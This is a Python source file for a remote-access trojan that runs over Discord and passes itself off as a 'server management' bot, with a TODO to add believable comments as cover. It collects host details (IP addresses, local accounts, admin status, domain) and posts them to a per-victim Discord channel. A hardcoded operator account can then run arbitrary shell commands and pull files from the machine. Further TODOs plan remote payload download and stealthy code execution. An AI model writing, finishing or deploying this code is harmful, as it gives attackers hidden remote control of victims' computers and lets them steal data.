"""
TODO: generate random believeable comments for the script.
"""
"""
    Discord bot client v0.1 by INSERT_NAME
    Used for server management, logging, and utility functions.
    DO NOT REMOVE!
    Please reach out to INSERT_NAME with any questions.
"""

import json
import os
import platform
import random
import requests
import socket
import string
import subprocess
from pathlib import Path

import discord
from discord.ext import commands

DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
CHECKIN_CHANNELS = set()
LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
EXIT_CONFIRMED = False

"""
TODO: for third-party modules, it should request them
from the server, and drop the wheel to disk, and then import.
"""

"""
TODO: need a download/put file function
"""

"""
TODO: need to come up with a clever way to run the python
maybe pipe to stdin or something similar
"""

"""
TODO: need to change to use urllib or something that is in the standard
library, or drop it to disk with requests
"""

try:
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents)
except:
    exit(1)

def main():    
    bot.run(DISCORD_TOKEN)

def random_alphanumeric(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def get_device_metadata():
    """
        Returns some initial metadata about the device.
    """
    metadata = {}
    
    hostname = socket.gethostname()

    _, _, iplist = socket.gethostbyname_ex(hostname)
    filtered_ips = [ip for ip in iplist if not ip.startswith("127.")]

    uname = platform.uname()
    winver = platform.win32_ver()
    local_accts = get_local_user_accounts()
    is_local_admin = get_local_admin_status()
    userdomain = os.environ.get("USERDOMAIN")
    logonserver = os.environ.get("LOGONSERVER")

    output_dict = {
        "hostname": hostname,
        "ip_list": filtered_ips,
        "os_info": str(uname)+str(winver),
        "accounts": local_accts,
        "is_local_admin": is_local_admin,
        "userdomain": userdomain,
        "logonserver": logonserver,
        "version": "0.1"
    }

    return json.dumps(output_dict, indent=4), output_dict

def get_local_user_accounts():
    """
        Returns local accounts by parsing 'net1 user' output.
    """
    users = {"local_accounts": []}

    try:
        proc = subprocess.run(["net1", "user"], capture_output=True, text=True, check=True)
        out = proc.stdout

        # 'net user' prints a header, then user names in columns, then a footer.
        # Extract lines between the header/footer and split.
        lines = out.splitlines()
        capture = False
        names = []
        for line in lines:
            if "----" in line:
                capture = not capture
                continue
            if "The command completed successfully" in line:
                continue
            if capture:
                tokens = [tok for tok in line.split() if tok]
                names.extend(tokens)
        users["local_accounts"] = sorted(set(names))
    except Exception as e:
        users["local_accounts"] = [f"Failed to run 'net user': {e}"]

    return users

def get_local_admin_status():
    """
        Returns true if the current process is running under a local admin,
        False otherwise.
    """
    result = subprocess.run(
        ["whoami", "/groups"],
        capture_output=True,
        text=True,
        shell=True
    )
    return "S-1-5-32-544" in result.stdout

def process_command(cmd_str):
    """
        TODO: parse command. Options:
        get -- get a file
        exec -- run a command
        -- if the cmd is cd {}, should do an os.setcwd()
        exit -- terminate process
    """
    usage_string = "Invalid command. Usage:\nexec <cmd>\nget <file>\nexit"

    parts = cmd_str.split(maxsplit=1)
    if not parts:
        return usage_string

    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else None

    commands = {
        "exec": execute_command,
        "get": get_content,
        "exit": lambda _: exit()
    }

    if cmd in commands:
        output = commands[cmd](arg)
        return output
    else:
        return usage_string

def execute_command(cmd_str):
    """
        Execute a command on behalf of the bot.
    """
    if cmd_str.startswith("cd"):
        # Process cd commands with os.chdir()
        try:
            # If the command is JUST "cd", return the cwd,
            # to be consistent with windows shell behavior.
            if cmd_str == "cd":
                result = f"{os.getcwd()}"
            else:
                os.chdir(cmd_str.split()[1])
                result = f"Changed directory to {cmd_str.split()[1]}"
        except Exception as e:
            result = f"Error: {e}"
    
    else:
        # Process other commands with subprocess.run()
        output = subprocess.run(
            cmd_str,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        result = output.stdout

    if len(result) > 0:
        return result
    else:
        return "Command returned no output"

def get_content(upload):
    """
        upload_id : GUID of upload from server
        upload_str : path to retrieve for upload
    """
    try:
        # Reads whole file into memory;
        # may not work well with large files
        p = Path(upload)
        with p.open("rb") as f:
            data = f.read()
            return data

    except FileNotFoundError as e:
        return e
    except PermissionError as e:
        return e
    except OSError as e:
        return e

# Should run after Bot() object is created?
@bot.event
async def on_ready():
    metadata_pretty, metadata = get_device_metadata()

    # Get channel_name from LOCKFILE if it exists
    if LOCKFILE.exists():
        channel_name = LOCKFILE.read_text(encoding="utf-8")
    else:
        channel_name = (metadata['hostname'] + "-" + random_alphanumeric(4)).lower()

    for guild in bot.guilds:
        existing = discord.utils.get(guild.text_channels, name=channel_name)
        if not existing:
            new_channel = await guild.create_text_channel(channel_name)
            await new_channel.send("📡 New device checked in!")
            await new_channel.send(metadata_pretty)
            CHECKIN_CHANNELS.add(channel_name)
            LOCKFILE.write_text(str(channel_name), encoding="utf-8")

        else:
            CHECKIN_CHANNELS.add(channel_name)
            await existing.send("📡 Device has checked in again!")
            await existing.send(metadata_pretty)

@bot.event
async def on_message(message):
    # Ignore other bots (including ourselves)
    if message.author.bot:
        return
    
    # Only process messages in the relevant channel
    if message.channel.name not in CHECKIN_CHANNELS:
        return

    if(message.author.id == 558898662772572160):
        output = process_command(message.content)
        await message.channel.send(output)

if __name__ == "__main__":
    main()